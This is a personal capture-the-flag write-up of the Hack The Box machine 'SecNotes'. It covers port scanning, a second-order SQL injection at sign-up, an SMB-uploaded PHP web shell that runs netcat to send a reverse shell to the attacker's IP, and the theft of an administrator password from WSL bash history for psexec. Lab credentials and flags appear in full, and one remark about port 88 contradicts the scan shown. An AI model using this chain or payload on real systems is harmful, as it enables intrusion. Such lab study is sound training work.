
## Intro


Tags: #windows #WebApp  #SQL-injection #OSCPpath #wsl #history #medium

---
# Reconnaissance

## Port scan

### Add target to hosts
```shell
echo '10.129.26.153 secnotes.htb' | sudo tee -a /etc/hosts
```

### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n secnotes.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 18:35 -0400
Nmap scan report for secnotes.htb (10.129.26.153)
Host is up (0.048s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds

```
the target appears to be a dc, one indicator is port 88 being open
### Scan specific open TCP ports
```shell
sudo nmap -p80,445,8808 -A $target
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 18:36 -0400
Nmap scan report for secnotes.htb (10.129.26.153)
Host is up (0.047s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Microsoft Windows 10 1909 - 2004 (91%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2026-04-11T15:36:53-07:00
|_clock-skew: mean: 2h19m47s, deviation: 4h02m30s, median: -13s
| smb2-time: 
|   date: 2026-04-11T22:36:55
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   46.14 ms 10.10.14.1
2   47.04 ms secnotes.htb (10.129.26.153)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.13 seconds

```

## WebApp
### Login page found

![](MediaFiles/Pasted%20image%2020260412013911.png)

----------
# Foothold 
## SQL injection

login doesnt work with this
```
' OR 1 OR'
```
so signed up with the above and then logged in with it, then plaintext creds found:
![](MediaFiles/Pasted%20image%2020260412014250.png)

#### creds obtained
```
\\secnotes.htb\new-site

tyler
92g!mA8BGjOirkL%OG*&
```

## Upload rev shell via smb
```powershell
smbclient \\\\10.129.26.153\\new-site -U tyler
```

rv.php
```php
<?php
system('nc.exe -e cmd.exe 10.10.14.217 3333')
?>
```
and upload it via smbclient
```powershell
smb: \> put rv.php
putting file rv.php as \rv.php (0.4 kB/s) (average 0.4 kB/s)
```

upload nc.exe also via smbclient:
```powershell
┌──(ch3ckm8㉿kali)-[/usr/share/windows-resources/binaries]
└─$ smbclient \\\\10.129.26.153\\new-site -U tyler
Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.
smb: \> put nc.exe
putting file nc.exe as \nc.exe (223.1 kB/s) (average 223.1 kB/s)
```

now trigger it via Load 
http://secnotes.htb:8808/rv.php

## Shell as tyler
```powershell
└─$ nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.26.153] 50357
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
whoami
secnotes\tyler

C:\Users\tyler\Desktop>hostname
hostname
SECNOTES

C:\Users\tyler\Desktop>type user.txt
type user.txt
865c6316e1f2ae2703dca07dd45699b9
```

----------
# Privesc

## privileges
```powershell
C:\Users\tyler\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State  
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

```

## Filesystem enumeration

### Bash and WSL

found bash.exe and wsl.exe

by running bash.exe i get tty shell as root on WSL

### Shell as root on WSL
```powershell
C:\Windows>where /R c:\windows bash.exe 
where /R c:\windows bash.exe 
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe

C:\Windows>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
whoami
root
python3 -c 'import pty; pty.spawn("/bin/bash")'

root@SECNOTES:~#
```

#### History
```powershell
root@SECNOTES:/# history
history
    1  cd /mnt/c/
    2  ls
    3  cd Users/
    4  cd /
    5  cd ~
    6  ls
    7  pwd
    8  mkdir filesystem
    9  mount //127.0.0.1/c$ filesystem/
   10  sudo apt install cifs-utils
   11  mount //127.0.0.1/c$ filesystem/
   12  mount //127.0.0.1/c$ filesystem/ -o user=administrator
   13  cat /proc/filesystems
   14  sudo modprobe cifs
   15  smbclient
   16  apt install smbclient
   17  smbclient
   18  smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
```
found plaintext creds for administrator on history!
##### creds obtained
```
administrator
u6!4ZwgwOM#^OBf#Nwnh
```
## Shell as administrator

```powershell
impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.26.153
```

```powershell
echo "User: $env:USERNAME"; echo "Hostname: $env:COMPUTERNAME"; whoami; ipconfig /all; type "C:\Users\Administrator\Desktop\root.txt"
```

```powershell
User: SECNOTES$
Hostname: SECNOTES
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : SECNOTES
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-94-D1-36
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::1ba(Preferred) 
   Lease Obtained. . . . . . . . . . : Saturday, April 11, 2026 3:34:29 PM
   Lease Expires . . . . . . . . . . : Saturday, April 11, 2026 5:04:28 PM
   IPv6 Address. . . . . . . . . . . : dead:beef::8935:d2b5:1441:898f(Preferred) 
   Temporary IPv6 Address. . . . . . : dead:beef::45bf:64f0:e3cb:9841(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::8935:d2b5:1441:898f%11(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.26.153(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Saturday, April 11, 2026 3:34:29 PM
   Lease Expires . . . . . . . . . . : Saturday, April 11, 2026 5:04:29 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%11
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 369119318
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-6C-84-CB-00-50-56-94-D1-36
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb
ad37e7c436935b7719db67dc538c517f
```

-----
# Summary




----
# Sidenotes

Revisit privesc part! more ways !